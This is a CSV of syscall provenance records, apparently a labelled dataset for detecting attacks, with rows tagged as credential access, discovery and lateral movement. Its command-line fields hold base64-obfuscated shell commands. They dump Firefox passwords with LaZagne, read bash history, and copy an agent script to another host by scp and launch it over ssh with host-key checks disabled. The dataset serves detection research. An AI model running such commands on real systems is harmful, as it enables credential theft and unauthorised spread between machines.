id,type,from,to,uid,egid,exe,gid,euid,name,pid,seen time,source,ppid,command line,start time,event id,time,operation,path,subtype,permissions,epoch,version,flags,local address,remote port,protocol,remote address,local port,tgid,fd,mode,label,subLabel,window
,WasDerivedFrom,19a10685d7cc89fed2465cf9a2106b40,b5358170f8fab3217ba3b6c7fd2f0e0b,,,,,,,135358.0,,syscall,,,,232031.0,1701607259.986,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,3879f2c55ec638d70140e7e82a499b86,14fc3bd6685e7bb329267a7b7595910c,,,,,,,135358.0,,syscall,,,,232032.0,1701607259.986,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,12271f8428dc1e96691e795b1087d87e,52534e23d0a6c107023e8769ad2acb65,,,,,,,135358.0,,syscall,,,,232033.0,1701607259.986,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,0b932ff8565bfc4642d90722c702d4ea,dc1493d1cd4931834c9c94d7fad2266d,,,,,,,135358.0,,syscall,,,,232034.0,1701607259.99,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,b5efed98dfdee33b0e36bfeddd9419d0,20900f3a71b9b9bbd4a0e9200f2a9eb3,,,,,,,135358.0,,syscall,,,,232035.0,1701607259.99,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
,WasDerivedFrom,119247a9a8fea23e64b6d8b9377757ab,d381a2cda5f41d1abb635c7a306f5555,,,,,,,135358.0,,syscall,,,,232036.0,1701607259.994,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
b10859c2fd0ec578d7133c672b964d01,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,138106.0,1701610388.889,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360173
bf0c3fd3b06ff0827d96f31304fa11fb,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,138106.0,,syscall,4127.0,"sh -c eval ""$(echo cHl0aG9uMyBMYVphZ25lLTIuNC41L0xpbnV4L2xhWmFnbmUucHkgYnJvd3NlcnMgLWZpcmVmb3ggPj4gL3RtcC8ucy9maXJlZm94X3Bhc3N3b3JkLnR4dA== | base64 --decode)""",1701610388.889,,,,,,,,,,,,,,,,,,1,credentialAccess,28360173
bbff389cc52aeaeddc999dc3247b4e25,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,147357.0,1701620700.002,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360345
1700802d19f0b6a111546e3e9bcf32cc,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,147357.0,,syscall,4127.0,"sh -c eval ""$(echo Y2F0IH4vLmJhc2hfaGlzdG9yeQ== | base64 --decode)""",1701620700.002,,,,,,,,,,,,,,,,,,1,credentialAccess,28360345
ac3504f9920bb98c268fa7d77a7d08aa,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,149940.0,1701623582.127,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28360393
be2f80974ba0f6fa98a2d881c88eea17,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,149940.0,,syscall,4127.0,"sh -c eval ""$(echo YXJwIC1h | base64 --decode)""",1701623582.127,,,,,,,,,,,,,,,,,,1,discovery,28360393
7b3cdfcc80a105af3ca96d78ddcfda9c,Process,,,1000.0,1000.0,/usr/sbin/arp,1000.0,1000.0,arp,149944.0,1701623582.155,syscall,149940.0,,,,,,,,,,,,,,,,,,,,1,discovery,28360393
86fe64bef7cfc5d236b26b3c6adcf04f,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,152566.0,1701626485.151,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
82fd22d6b1a5094a8d89584a450cd646,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,152566.0,,syscall,4127.0,"sh -c eval ""$(echo c2NwIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgc2FuZGNhdC5iYXNoICBlcmZhbjJAMTcyLjE2LjY0LjEyODp+L0Rlc2t0b3A7IHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gVXNlcktub3duSG9zdHNGaWxlPS9kZXYvbnVsbCAtbyBDb25uZWN0VGltZW91dD0zIGVyZmFuMkAxNzIuMTYuNjQuMTI4ICdub2h1cCBjaG1vZCB1K3ggLi9EZXNrdG9wL3NhbmRjYXQuYmFzaCc7c3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgZXJmYW4yQDE3Mi4xNi42NC4xMjggJ25vaHVwIC4vRGVza3RvcC9zYW5kY2F0LmJhc2gn | base64 --decode)""",1701626485.151,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
09f2c865255e0dd3da2f3e33c955e94f,Process,,,1000.0,1000.0,/usr/bin/scp,1000.0,1000.0,scp,152570.0,1701626485.159,syscall,152566.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
edada763eb8341869cc2482b34fc7705,Process,,,1000.0,1000.0,/usr/bin/scp,1000.0,1000.0,scp,152570.0,,syscall,152566.0,scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.bash erfan2@172.16.64.128:~/Desktop,1701626485.159,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
e5f46056ef074525f6e1febcd05bd6bd,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152571.0,1701626485.167,syscall,152570.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
59fd9481258102acb3b649cdc7cd7a11,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152571.0,,syscall,152570.0,/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -l erfan2 -- 172.16.64.128 scp -t ~/Desktop,1701626485.167,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
86e9c9bf7f6b786bf03eb30b58c10b5c,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152598.0,1701626511.882,syscall,152566.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
a26390a44a4e9717c930e77d300e2cd5,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152598.0,,syscall,152566.0,ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup chmod u+x ./Desktop/sandcat.bash,1701626511.882,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
2766fab1d748b6da6e8f33ca40a3c29f,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152612.0,1701626525.453,syscall,152566.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360442
a08d65887c2473ce28c243387d8ab3b7,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152612.0,,syscall,152566.0,ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup ./Desktop/sandcat.bash,1701626525.453,,,,,,,,,,,,,,,,,,1,lateralMovement,28360442
